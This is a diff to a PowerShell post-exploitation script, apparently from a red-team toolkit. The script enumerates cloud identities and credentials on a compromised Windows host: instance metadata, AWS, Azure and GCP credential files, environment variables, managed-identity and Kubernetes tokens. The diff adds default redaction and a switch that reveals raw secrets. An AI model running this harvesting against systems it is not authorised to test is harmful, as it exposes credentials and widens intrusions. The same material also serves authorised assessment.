@@ -1,6 +1,7 @@
 # gather/windows/enum-cloud-credentials.ps1 — Cloud credential and identity enumeration on Windows
 # Requires: Any user (IMDS accessible from instance without privilege)
 # Read-only: YES — read-only queries only
+# Sensitive-output: YES — redacted by default; set BRJOTSKEL_REVEAL_SECRETS=1 to print raw material
 # Footprint: Zero (no temp files, no disk writes)
 # Purpose: Detect attached cloud identities, IAM roles, managed identities, and service accounts.
 #          A compromised Windows cloud instance may have an attached role with blast radius
@@ -11,8 +12,31 @@
 # Run inline: remote_exec(session="host01", command="<paste>")
 
 $ErrorActionPreference = 'SilentlyContinue'
+$RevealSecrets = $env:BRJOTSKEL_REVEAL_SECRETS -eq '1'
 
 function Sec($n) { Write-Output "`n=== $n ===" }
+function Protect-SecretLine {
+  process {
+    if ($RevealSecrets) { $_; return }
+    ($_ -replace '(?i)(aws_secret_access_key\s*=\s*)\S+', '$1<redacted>' `
+       -replace '(?i)(aws_session_token\s*=\s*)\S+', '$1<redacted>' `
+       -replace '(?i)("SecretAccessKey"\s*:\s*")[^"]+', '$1<redacted>' `
+       -replace '(?i)("Token"\s*:\s*")[^"]+', '$1<redacted>' `
+       -replace '(?i)("access_token"\s*:\s*")[^"]+', '$1<redacted>' `
+       -replace '(?i)("refresh_token"\s*:\s*")[^"]+', '$1<redacted>' `
+       -replace '(?i)(token\s*[=:]\s*)\S+', '$1<redacted>' `
+       -replace '(?i)(secret\s*[=:]\s*)\S+', '$1<redacted>' `
+       -replace '(?i)(password\s*[=:]\s*)\S+', '$1<redacted>' `
+       -replace '(?i)(https?://[^:/]+:)[^@]+@', '$1<redacted>@')
+  }
+}
+function Show-SecretFile($Path, $First = 20) {
+  if ($RevealSecrets) { Get-Content $Path | Select-Object -First $First }
+  else {
+    Write-Output "[REDACTED] $Path present; raw values hidden"
+    Get-Content $Path | Select-Object -First $First | Protect-SecretLine
+  }
+}
 
 $timeout = 2  # seconds for IMDS requests
 
@@ -34,6 +58,7 @@ function TryGetRaw($uri, $headers = @{}, $method = 'GET', $body = $null) {
 Sec 'CLOUD CREDENTIAL ENUMERATION HEADER'
 Write-Output "Host:      $env:COMPUTERNAME"
 Write-Output "Timestamp: $((Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ'))"
+Write-Output "Secret output: $(if ($RevealSecrets) { 'REVEAL enabled' } else { 'REDACTED; set BRJOTSKEL_REVEAL_SECRETS=1 to reveal raw tokens/keys' })"
 
 Sec 'ENVIRONMENT DETECTION'
 Write-Output "--- Hypervisor and system product name ---"
@@ -49,7 +74,10 @@ if ($sysInfo -match 'Google')                   { Write-Output "[!] Likely GCP" 
 Write-Output "`n--- Environment variables (cloud credential clues) ---"
 [System.Environment]::GetEnvironmentVariables() | Where-Object {
   $_.Key -match 'AWS_|AZURE_|GOOGLE_|GCP_|MSI_|IDENTITY_'
-} | Format-List
+} | ForEach-Object {
+  if ($RevealSecrets -or $_.Key -notmatch '(?i)SECRET|TOKEN|PASSWORD|KEY') { "$($_.Key)=$($_.Value)" }
+  else { "$($_.Key)=<redacted>" }
+}
 
 Sec 'AWS EC2 — INSTANCE METADATA SERVICE (IMDSv1/v2)'
 # IMDSv2: PUT to get a session token, then GET with that token
@@ -99,7 +127,10 @@ Sec 'AWS — STATIC CREDENTIALS'
 Write-Output "--- AWS environment variables ---"
 $awsEnvVars = [System.Environment]::GetEnvironmentVariables() | Where-Object { $_.Key -match '^AWS_' }
 if ($awsEnvVars) {
-  $awsEnvVars | Format-List
+  $awsEnvVars | ForEach-Object {
+    if ($RevealSecrets -or $_.Key -notmatch '(?i)SECRET|TOKEN|PASSWORD|KEY') { "$($_.Key)=$($_.Value)" }
+    else { "$($_.Key)=<redacted>" }
+  }
 } else {
   Write-Output "(none)"
 }
@@ -116,7 +147,7 @@ foreach ($path in $credPaths) {
   foreach ($f in $expanded) {
     if (Test-Path $f) {
       Write-Output "[!] Found: $f"
-      Get-Content $f | Select-Object -First 20
+      Show-SecretFile $f 20
     }
   }
 }
@@ -147,7 +178,11 @@ if ($msiToken) {
     $diff = $expiry - (Get-Date).ToUniversalTime()
     Write-Output "[!] Token expires in: $([int]$diff.TotalMinutes) minutes"
   }
-  Write-Output "access_token (first 40 chars): $($msiToken.access_token.Substring(0, [Math]::Min(40, $msiToken.access_token.Length)))..."
+  if ($RevealSecrets) {
+    Write-Output "access_token (first 40 chars): $($msiToken.access_token.Substring(0, [Math]::Min(40, $msiToken.access_token.Length)))..."
+  } else {
+    Write-Output "access_token: <redacted>"
+  }
 } else {
   Write-Output "(no managed identity, or not Azure)"
 }
@@ -163,7 +198,7 @@ foreach ($path in $azCliPaths) {
   foreach ($f in $expanded) {
     if (Test-Path $f) {
       Write-Output "[!] Azure CLI tokens: $f"
-      Get-Content $f | Select-Object -First 5
+      Show-SecretFile $f 5
     }
   }
 }
@@ -214,7 +249,7 @@ foreach ($path in $gcpPaths) {
   foreach ($f in $expanded) {
     if (Test-Path $f) {
       Write-Output "[!] GCP ADC: $f"
-      Get-Content $f | Select-Object -First 5
+      Show-SecretFile $f 5
     }
   }
 }
@@ -230,7 +265,7 @@ foreach ($path in $dockerPaths) {
   foreach ($f in $expanded) {
     if (Test-Path $f) {
       Write-Output "[!] Docker config: $f"
-      Get-Content $f | Select-Object -First 10
+      Show-SecretFile $f 10
     }
   }
 }
@@ -239,7 +274,12 @@ Write-Output "`n--- Kubernetes service account (if containerised) ---"
 $k8sToken = 'C:\var\run\secrets\kubernetes.io\serviceaccount\token'
 if (Test-Path $k8sToken) {
   Write-Output "[!] K8s service account token present: $k8sToken"
-  (Get-Content $k8sToken -Raw).Substring(0, [Math]::Min(200, (Get-Content $k8sToken -Raw).Length))
+  if ($RevealSecrets) {
+    (Get-Content $k8sToken -Raw).Substring(0, [Math]::Min(200, (Get-Content $k8sToken -Raw).Length))
+  } else {
+    $raw = Get-Content $k8sToken -Raw
+    Write-Output "[REDACTED] bytes: $($raw.Length)"
+  }
 }
 
 Sec 'RECORDING GUIDANCE'
